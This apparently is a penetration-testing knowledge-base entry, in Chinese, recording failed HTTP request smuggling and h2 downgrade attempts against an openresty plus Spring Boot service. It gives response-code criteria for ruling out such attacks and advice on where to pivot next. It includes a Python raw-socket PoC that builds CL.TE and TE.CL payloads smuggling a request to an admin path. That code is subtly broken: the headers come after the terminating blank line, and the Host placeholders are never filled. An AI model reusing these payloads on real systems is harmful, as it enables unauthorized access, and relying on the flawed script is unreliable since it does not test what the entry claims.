# openresty 1.29 + Spring Boot：请求走私(CL.TE/TE.CL/TE.TE)与 h2 降级全族阴性（勿再重打）

- **code**: openresty-1.29-spring-boot-请求走私-cl.te-te.cl-te.te-与-h2-降级全
- **kind**: payload
- **category**: auth-bypass
- **component**: openresty/203.0.113.8 + Spring Boot
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 原始 socket（python ssl）+ curl 双工具复核：CL+TE 任意取值组合恒 400/565B；TE 变体 400/501；dup CL 400；CL=999999999 → 413；HTTP/1.0+TE 400；obs-fold CL 400；GET 带 CL 正文时 nginx 吃满正文后自己处理第二个请求（响应里依次出现 66B 上游 404 与 0B openresty 404），上游零执行；openssl s_client -alpn h2 → "No ALPN negotiated"，python 只发 h2 → tlsv1 alert no_application_protocol；h2c prior-knowledge → 400。
- **path**: pocs/openresty-1.29-spring-boot-请求走私-cl.te-te.cl-te.te-与-h2-降级全/poc.py
- **created_at**: 2026-10-20T01:09:45.737Z

## 描述

用于快速判否：现代 nginx/openresty 在解析器层杜绝了「CL 与 TE 共存」的所有利用形态，且若 ALPN 不给 h2 则 h2→h1.1 降级注入面根本不存在。命中这些特征就别再在协议层磨，转路径归一化/应用层。

## 用法

```
判据速查：
1) 同时发 Content-Length 与 Transfer-Encoding → 400（不管 CL 是 5/05/+5/5 /0x5/"5, 5"/重复，也不管 TE 是 chunked/xchunked/CHUNKED/chunked,cow/双 chunked）→ 前端硬化，CL.TE 与 TE.TE 全灭；
2) Transfer-Encoding: chunked, identity 或 Transfer-Encoding:\tchunked → 501 Not Implemented（只认 chunked）；
3) 两个相同 CL → 400；CL 超大 → 413；
4) HTTP/1.0 + TE:chunked → 400；
5) GET 携带 Content-Length 正文（正文内塞第二个请求）→ 前端按 CL 吃满，第二个请求由前端自己再解析（会看到两个响应，但第二个是前端产物，不是上游执行）；
6) openssl s_client -connect host:port -servername host -alpn h2 → "No ALPN negotiated" ⇒ h2 面不存在，无需再测 :path/:authority 注入与 h2c。
阴性场景下继续投入的正确转向：路径归一化差异（原始 socket，curl 会归一化路径，必须手发）、应用层参数注入、内网/回环视角。
```

## 正文

```
复现脚本骨架（python3，直连不走代理）：

import socket, ssl
def conn(host,port,alpn=("http/1.1",)):
    c=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); c.check_hostname=False; c.verify_mode=ssl.CERT_NONE
    c.set_alpn_protocols(list(alpn))
    s=c.wrap_socket(socket.create_connection((host,port),timeout=8),server_hostname=host)
    print("ALPN:", s.selected_alpn_protocol())
    return s

def send(raw, host="203.0.113.81", port=1273):
    s=conn(host,port); s.sendall(raw); buf=b""
    try:
        while True:
            b=s.recv(65535)
            if not b: break
            buf+=b
    except Exception: pass
    s.close(); return buf

smug = b"GET /melody-admin/ HTTP/1.1\r\nHost: %s:%d\r\n\r\n"
base = (b"POST /melody/api/v1/heart HTTP/1.1\r\nHost: %s:%d\r\n\r\n")

# CL.TE（期望：400，说明前端拒绝共存，而不是把走私请求放行）
body = b"0\r\n\r\n" + smug
r = base + b"Content-Length: %d\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n" % len(body) + body

# TE.CL
chunk = ("%x\r\n" % len(smug)).encode() + smug + b"\r\n0\r\n\r\n"
r2 = base + b"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n" + chunk

# h2 探测
try: conn("203.0.113.81",1273,("h2",))
except Exception as e: print("h2 refused:", e)   # tlsv1 alert no application protocol

判据：CL+TE 命中 400 即代表该前端不会被 CL/TE 歧义劫持；若想确认上游是否被执行，看响应条数与响应体指纹（上游 Spring 的 JSON 404/401 vs 前端的 0 体 404）。
```
